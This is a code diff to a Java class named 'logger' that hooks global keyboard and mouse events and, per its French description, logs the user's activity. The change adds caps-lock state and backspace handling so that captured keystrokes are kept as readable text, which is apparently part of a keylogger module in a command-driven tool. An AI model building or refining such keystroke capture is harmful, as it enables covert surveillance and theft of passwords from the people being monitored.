@@ -20,6 +20,7 @@ public class logger extends CMDRunnable implements NativeKeyListener, NativeMous
 	
 	private List<String> chaine;
 	private String current = "";
+	private boolean isMaj = false;
 	
 	@Override
 	public void execute(String[] arg) {
@@ -44,7 +45,7 @@ public class logger extends CMDRunnable implements NativeKeyListener, NativeMous
 		System.out.println("Log les activité de l'utilisateur");
 		
 	}
-
+	
 	@Override
 	public String getDescription() {
 		return "Log les activité de l'utilisateur";
@@ -58,7 +59,23 @@ public class logger extends CMDRunnable implements NativeKeyListener, NativeMous
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
 		String keyText = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
-		this.current += keyText;
+		if(keyText.equals("Retour arrière") || keyText.equals("Enter")) {
+			if(this.current.length() > 0) {
+				this.current = this.current.substring(0, this.current.length()-1);
+			}
+			return;
+		}
+		if(keyText.equals("Caps Lock") || keyText.equals("Verrouillage des majuscules")) {
+			this.isMaj = !this.isMaj;
+		}
+		if(keyText.length() > 1) {
+			return;
+		}
+		if(this.isMaj) {
+			this.current += keyText.toUpperCase();
+		} else {
+			this.current += keyText.toLowerCase();
+		}
 		update();
 	}
 	@Override
